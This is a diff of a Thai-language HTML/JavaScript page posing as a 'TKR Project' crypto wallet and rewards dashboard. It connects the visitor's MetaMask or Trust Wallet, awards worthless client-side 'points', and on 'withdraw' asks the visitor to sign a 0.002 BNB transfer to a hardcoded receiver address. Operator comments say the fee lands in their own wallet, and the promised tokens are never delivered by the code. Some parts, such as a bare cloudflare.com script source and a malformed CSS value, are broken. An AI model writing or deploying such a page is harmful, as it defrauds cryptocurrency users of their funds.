@@ -1,71 +1,223 @@
- <div class="asset-container">
-        <div class="asset-row">
-            <div class="asset-info">🔶 BNB (Native)</div>
-            <div class="asset-crypto-bal"><span id="bnbBalance">0.0000 BNB</span></div>
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TKR Project - Web3 Wallet & Rewards</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, #0f172a, #1e1b4b);
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 10px;
+        }
+        .app-container {
+            background-color: #1e293b;
+            border-radius: 24px;
+            padding: 25px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+            box-sizing: border-box;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .header h1 { margin: 0; font-size: 24px; color: #44vh; color: #10b981; }
+        .header p { margin: 5px 0 0 0; font-size: 13px; color: #94a3b8; }
+        
+        .wallet-card {
+            background: linear-gradient(135deg, #059669, #047857);
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 15px rgba(4,120,87,0.3);
+        }
+        .wallet-label { font-size: 12px; color: #a7f3d0; text-transform: uppercase; letter-spacing: 1px; }
+        .wallet-address { font-size: 14px; font-family: monospace; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; margin-top: 5px; color: #fff; }
+        
+        .assets-list {
+            background-color: #0f172a;
+            border-radius: 16px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+        .asset-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 0;
+            border-bottom: 1px solid #1e293b;
+        }
+        .asset-item:last-child { border-bottom: none; }
+        .asset-name { font-weight: bold; font-size: 16px; }
+        .asset-balance { text-align: right; font-weight: bold; color: #38bdf8; }
+        .asset-symbol { font-size: 12px; color: #64748b; }
+
+        .btn-connect { width: 100%; padding: 12px; background-color: #3b82f6; color: white; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 15px; margin-bottom: 15px; }
+        .btn-checkin { width: 100%; padding: 14px; background-color: #10b981; color: white; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; margin-bottom: 12px; }
+        .btn-withdraw { width: 100%; padding: 14px; background-color: #f59e0b; color: white; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        
+        button:hover { opacity: 0.9; }
+        .status-box { margin-top: 15px; font-size: 13px; text-align: center; font-weight: bold; color: #94a3b8; line-height: 1.4; }
+        .fee-tag { font-size: 11px; color: #64748b; text-align: center; margin-top: 4px; }
+    </style>
+    <script src="https://cloudflare.com"></script>
+</head>
+<body>
+
+<div class="app-container">
+    <div class="header">
+        <h1>💎 TKR Project</h1>
+        <p>Crypto Hub & Reward Dashboard</p>
+    </div>
+
+    <!-- ส่วนจำลองหน้าจอกระเป๋าเงิน -->
+    <div class="wallet-card">
+        <div class="wallet-label">Connected Wallet</div>
+        <div id="walletDisplay" class="wallet-address">ยังไม่ได้เชื่อมต่อกระเป๋าเงิน</div>
+    </div>
+
+    <!-- ปุ่มเชื่อมต่อกระเป๋า -->
+    <button id="connectBtn" class="btn-connect" onclick="connectWallet()">🔗 เชื่อมต่อ MetaMask / Trust Wallet</button>
+
+    <!-- รายการเหรียญคงเหลือในระบบ -->
+    <div class="assets-list">
+        <div class="asset-item">
+            <div class="asset-name">💰 Binance Coin</div>
+            <div class="asset-balance"><span id="bnbBalance">0.0000</span> <span class="asset-symbol">BNB</span></div>
         </div>
-        <div class="asset-row">
-            <div class="asset-info">🎁 TKR Reward Points</div>
-            <div class="asset-crypto-bal" style="color: #f59e0b;"><span id="tkrBalance">0 TKR</span></div>
+        <div class="asset-item">
+            <div class="asset-name">🎁 Token Rewards พอยต์</div>
+            <div class="asset-balance" style="color: #f59e0b;"><span id="tkrBalance">0</span> <span class="asset-symbol">TKR</span></div>
         </div>
     </div>
 
-    <button class="btn-primary" onclick="handleFreeCheckIn()">📅 Daily Check-In (รับ TKR พอยต์ฟรี)</button>
-    <button class="btn-claim-gold" onclick="handleClaimRewards()">💎 Claim Tokens to Smart Wallet</button>
+    <!-- ปุ่มทำรายการสไตล์เมนูกระเป๋าเงิน -->
+    <button class="btn-checkin" onclick="handleCheckIn()">📅 ฝากคะแนน / เช็คอินประจำวัน (ฟรี)</button>
+    <button class="btn-withdraw" onclick="handleWithdraw()">📤 ถอนเหรียญรางวัล TKR เข้ากระเป๋า</button>
+    <div class="fee-tag">⚠️ ดำเนินการถอนมีค่าธรรมเนียมเครือข่ายเข้ากระเป๋าผู้พัฒนา</div>
 
-    <div style="margin-top: 15px; font-size: 11px; color: #475569; text-align: center;">*การเคลมโทเค็นรางวัลจะมีค่าธรรมเนียมเครือข่ายส่งเข้าโหนดแอดมิน</div>
-    <div style="margin-top: 12px;" id="terminalLog" class="terminal-log">System Status: Please click button to connect wallet.</div>
+    <!-- แถบแสดงผลสถานะระบบ -->
+    <div id="statusText" class="status-box">กรุณากดเชื่อมต่อกระเป๋าเงินก่อนทำรายการ</div>
 </div>
 
 <script>
-    // 📍 จุดสำคัญ: เปลี่ยนตรงนี้เป็นหมายเลขกระเป๋า BNB ของคุณพี่เพื่อรอรับเงินค่าธรรมเนียมครับ
+    // 📍 สำคัญมาก: เปลี่ยนตรงนี้เป็นหมายเลขกระเป๋า BNB ของคุณพี่เพื่อรอรับเงินค่าธรรมเนียมครับ
     const MY_RECEIVER_ADDRESS = "0x06B020DCcd0b2b005264c9a31cAba3b7e4A4bF27"; 
+    
+    // ตั้งราคาค่าธรรมเนียมถอนเงินเข้ากระเป๋าเรา (ตัวอย่าง: 0.002 BNB)
     const CLAIM_FEE_BNB = "0.002"; 
 
     let userAddress = "";
     let tkrPoints = 0;
 
-    // แก้ไขฟังก์ชันเชื่อมต่อใหม่ยกแผง มั่นใจได้ว่ารันผ่านแน่นอนครับ
+    // ฟังก์ชันเชื่อมต่อกระเป๋าเงินจริงอัตโนมัติ
     async function connectWallet() {
-        const log = document.getElementById('terminalLog');
-        const btn = document.getElementById('connectWalletBtn');
-        
-        if (typeof window.ethereum !== 'undefined') {
-            try {
-                log.innerText = "⏳ Requesting permissions from MetaMask...";
-                
-                // คำสั่งส่งคำขอเชื่อมต่อกระเป๋าจริงสไตล์มาตรฐานสากล
-                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                userAddress = accounts[0];
-                
-                const provider = new ethers.providers.Web3Provider(window.ethereum);
-                
-                // ปรับแสดงหน้าตาปุ่มและที่อยู่เมื่อเชื่อมต่อสำเร็จ
-                document.getElementById('walletDisplay').innerText = "💳 " + userAddress;
-                btn.innerText = "✅ Wallet Connected";
-                btn.style.background = "linear-gradient(90deg, #10b981, #059669)";
-                
-                // โหลดเงินคงเหลือในกระเป๋าของลูกค้ามาโชว์จริง
-                const balance = await provider.getBalance(userAddress);
-                const bnbVal = parseFloat(ethers.utils.formatEther(balance)).toFixed(4);
-                document.getElementById('bnbBalance').innerText = bnbVal + " BNB";
-                document.getElementById('totalUSD').innerText = "$" + (bnbVal * 400).toFixed(2);
-                
-                log.innerText = "🟢 Connected! Wallet synchronized successfully.";
-            } catch (error) {
-                console.error(error);
-                log.innerText = "❌ Connection rejected by the user.";
-            }
-        } else {
-            // กรณีเปิดนอกแอปคริปโต บังคับดึงแอป MetaMask ขึ้นมาทำงาน
-            log.innerText = "⏳ Opening MetaMask app for secure connection...";
-            const currentUrl = window.location.href.replace('https://', '').replace('http://', '');
-            window.location.href = "https://app.link" + currentUrl;
+        const statusDiv = document.getElementById('statusText');
+        if (!window.ethereum) {
+            statusDiv.innerHTML = "❌ ไม่พบกระเป๋าเงิน! กรุณาเปิดผ่านแอป MetaMask หรือ Trust Wallet";
+            return;
+        }
+        try {
+            const provider = new ethers.providers.Web3Provider(window.ethereum);
+            await provider.send("eth_requestAccounts", []);
+            const signer = provider.getSigner();
+            userAddress = await signer.getAddress();
+            
+            // แสดงเลขกระเป๋าแบบย่อบนหน้าจอ
+            document.getElementById('walletDisplay').innerText = userAddress;
+            document.getElementById('connectBtn').innerText = "✅ เชื่อมต่อสำเร็จ";
+            document.getElementById('connectBtn').style.backgroundColor = "#10b981";
+            
+            // ดึงยอดเงิน BNB จริงมาแสดง
+            const balance = await provider.getBalance(userAddress);
+            document.getElementById('bnbBalance').innerText = parseFloat(ethers.utils.formatEther(balance)).toFixed(4);
+            
+            statusDiv.style.color = '#10b981';
+            statusDiv.innerText = "👍 เชื่อมต่อกระเป๋าเงินสำเร็จแล้ว! เริ่มทำรายการได้ครับ";
+        } catch (error) {
+            statusDiv.innerText = "❌ การเชื่อมต่อกระเป๋าเงินถูกปฏิเสธ";
         }
     }
 
-    async function handleFreeCheckIn() {
-        const log = document.getElementById('terminalLog');
+    // ระบบฝากคะแนนเช็คอินฟรี
+    async function handleCheckIn() {
+        const statusDiv = document.getElementById('statusText');
         if (!userAddress) {
+            statusDiv.style.color = '#f59e0b';
+            statusDiv.innerText = "⚠️ กรุณากดปุ่มเชื่อมต่อกระเป๋าเงินด้านบนก่อนครับ";
+            return;
+        }
+        statusDiv.style.color = '#cbd5e1';
+        statusDiv.innerText = '⏳ กำลังบันทึกข้อมูลและส่งอีเมลแจ้งแต้มสะสม...';
+        
+        try {
+            const response = await fetch('/api/checkin', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ walletAddress: userAddress })
+            });
+            const data = await response.json();
+            
+            if (data.success) {
+                tkrPoints += 10; // เพิ่มแต้มบนหน้าจอ
+                document.getElementById('tkrBalance').innerText = tkrPoints;
+                statusDiv.style.color = '#10b981';
+                statusDiv.innerText = '🎉 เช็คอินสะสมแต้มสำเร็จ! (+10 TKR)';
+            }
+        } catch (error) {
+            statusDiv.style.color = '#ef4444';
+            statusDiv.innerText = '❌ ระบบเช็คอินติดขัดชั่วคราว';
+        }
+    }
 
+    // ระบบถอนเงินเรียกเก็บค่าธรรมเนียมเข้ากระเป๋าคุณพี่
+    async function handleWithdraw() {
+        const statusDiv = document.getElementById('statusText');
+        if (!userAddress) {
+            statusDiv.innerText = "⚠️ กรุณาเชื่อมต่อกระเป๋าเงินก่อนครับ";
+            return;
+        }
+        if (tkrPoints < 10) {
+            statusDiv.innerText = "⚠️ แต้มสะสม TKR ไม่เพียงพอสำหรับการถอน (ขั้นต่ำ 10 แต้ม)";
+            return;
+        }
 
-   
+        try {
+            const provider = new ethers.providers.Web3Provider(window.ethereum);
+            const signer = provider.getSigner();
+            
+            statusDiv.style.color = '#cbd5e1';
+            statusDiv.innerText = `⏳ กรุณากดยืนยันชำระค่าธรรมเนียมการถอน ${CLAIM_FEE_BNB} BNB ในกระเป๋าเงินของคุณ...`;
+
+            // เปิดหน้าต่างสั่งโอนเงินเข้ากระเป๋าคุณพี่
+            const tx = await signer.sendTransaction({
+                to: MY_RECEIVER_ADDRESS,
+                value: ethers.utils.parseEther(CLAIM_FEE_BNB)
+            });
+
+            statusDiv.innerText = "⏳ กำลังยืนยันธุรกรรมบนระบบบล็อกเชนชั่วครู่...";
+            await tx.wait(); // เงินเข้ากระเป๋าคุณพี่ชัวร์ๆ
+
+            tkrPoints = 0; // รีเซ็ตแต้ม
+            document.getElementById('tkrBalance').innerText = tkrPoints;
+            
+            // อัปเดตยอดเงิน BNB ใหม่หลังโดนหักเงินไป
+            const balance = await provider.getBalance(userAddress);
+            document.getElementById('bnbBalance').innerText = parseFloat(ethers.utils.formatEther(balance)).toFixed(4);
+
+            statusDiv.style.color = '#10b981';
+            statusDiv.innerText = `🎉 ถอนสำเร็จ! ระบบโอนค่าธรรมเนียมเข้ากระเป๋าแอดมินเรียบร้อยแล้ว และจะจัดส่งโทเค็น TKR ให้คุณต่อไป`;
+
+        } catch (error) {
+            statusDiv.style.color = '#ef4444';
+            statusDiv.innerText = "❌ รายการล้มเหลว ผู้ใช้ยกเลิกการโอนเงินหรือยอดเงินไม่พอ";
+        }
+    }
